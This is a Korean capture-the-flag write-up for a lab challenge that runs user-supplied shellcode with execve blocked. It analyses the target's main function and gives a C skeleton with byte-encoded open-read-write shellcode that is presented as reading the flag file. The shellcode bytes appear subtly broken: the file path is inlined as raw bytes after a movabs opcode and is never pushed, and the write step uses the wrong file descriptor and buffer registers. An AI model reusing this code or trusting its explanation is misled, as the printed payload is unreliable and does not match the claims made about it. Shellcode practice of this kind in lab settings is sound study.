# 문제
입력한 셸코드를 실행하는 프로그램이 서비스로 등록되어 작동하고 있습니다.

main 함수가 아닌 다른 함수들은 execve, execveat 시스템 콜을 사용하지 못하도록 하며, 풀이와 관련이 없는 함수입니다.

flag 파일의 위치와 이름은 /home/shell_basic/flag_name_is_loooooong입니다.
감 잡기 어려우신 분들은 아래 코드를 가지고 먼저 연습해보세요!

플래그 형식은 DH{...} 입니다. DH{와 }도 모두 포함하여 인증해야 합니다.


# 주어진 파일에서 main 함수를 확인
```
void main(int argc, char *argv[]) {
  char *shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);    // 쉘코드를 저장하고 실행하는 공간
  void (*sc)();
  
  init();
  
  banned_execve();       // execve쉘코드 차단

  printf("shellcode: ");
  read(0, shellcode, 0x1000);

  sc = (void *)shellcode;
  sc();
}
```

  1) 이 코드는 문제 풀이에 직접적으로 사용되는 코드가 아니라, 문제 풀이의 환경과 제약 사항을 이해하는 데 도움을 주는 코드이다.
    
  2) 우리가 알 수 있는 정보
```
char *shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
```
- 메모리 할당 정보
   > mmap()을 통해 읽기, 쓰기, 실행 권한이 모두 부여된 메모리 페이지가 할당된다.
   > **우리가 쉘코드를 이용해 문제를 풀 수 있는 환경이 보장된다는 말이다!**

 - 크기 제한
   > 할당된 메모리 크기는 0x1000 이다.
   > **쉘코드의 크기는 4096바이트 이하로 작성해야 한다.**

```
banned_execve();
```
- execve 쉘코드 사용이 금지된다.
  > **orw쉘코드를 사용해 파일을 읽어야 한다.**

```
read(0, shellcode, 0x1000);
sc = (void *)shellcode;
sc();
```
- 프로그램은 표준 입력을 통해 쉘코드를 입력받아 할당된 메모리에 저장한다는 의미. 그래서 **우리는 직접 작성한 쉘코드를 표준 입력으로 제공하면 된다.**
  > 어떻게 알 수 있는가?) read() 시스템 콜의 첫 번쨰 인자로 들어간 0이 표준 입력을 나타낸다.



# 이제 orw쉘코드를 작성하자.
```
#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = 
"\x48\x31\xc0\x48\xbf\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x65\x6c\x6c\x5f"
"\x62\x61\x73\x69\x63\x2f\x66\x6c\x61\x67\x5f\x6e\x61\x6d\x65\x5f\x69"
"\x73\x5f\x6c\x6f\x6f\x6f\x6f\x6f\x6e\x67\x00\x48\x89\xe7\x48\x31\xf6"
"\x48\x31\xd2\xb0\x02\x0f\x05\x48\x89\xc7\x48\x31\xc0\x48\x89\xe6\xb2"
"\x80\x0f\x05\x48\x31\xff\x48\x89\xc6\xb0\x01\x0f\x05";

int main() {
    printf("Running shellcode...\n");
    void (*sc)() = (void (*)())shellcode;
    sc();
    return 0;
}
```
1) 이 코드는 /home/shell_basic/flag_name_is_loooooong 파일을 열 수 있도록 어셈블리어로 작성된 ORW shellcode를 C 언어 스켈레톤 코드에 이식한 후, 바이트 코드로 변환한 결과물이다.


     
